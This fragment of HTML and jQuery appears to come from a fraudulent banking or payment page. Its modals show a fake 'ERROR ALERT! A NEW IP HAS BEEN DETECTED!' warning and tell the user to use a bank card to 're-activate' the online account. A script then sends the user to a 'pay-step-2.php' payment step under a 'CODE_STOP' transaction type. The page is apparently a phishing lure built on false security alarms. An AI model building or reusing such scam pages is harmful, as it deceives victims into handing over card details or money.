    ...
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title"><img src="assets/images/error.png" style="width: 45px" /><b> ERROR ALERT! </b></h5>
               
            </div>
            <div class="modal-body">
                <p><b>A NEW IP HAS BEEN DETECTED! </b></p> <p><b>KINDLY RE-APPLY TO RE-ACTIVATE YOUR ACCOUNT </b></p>
                <form>
                   <br/>
   ...
   <div id="myModal1" class="modal fade">
    <div class="modal-dialog">
        <div class="modal-content">
            ...
            <div class="modal-body">
                <p>KINDLY USE YOUR BANK CARD TO ACTIVATE YOUR ONLINE ACCOUNT</p>
                <form>
...
<script>
    ...
    $("#next").click(function(){
        ...
        if(transtype == "CODE_STOP"){
            ...
            loadOn();
            window.location.href="pay-step-2.php?amount="+amt+"&type=internal"
        }
    })
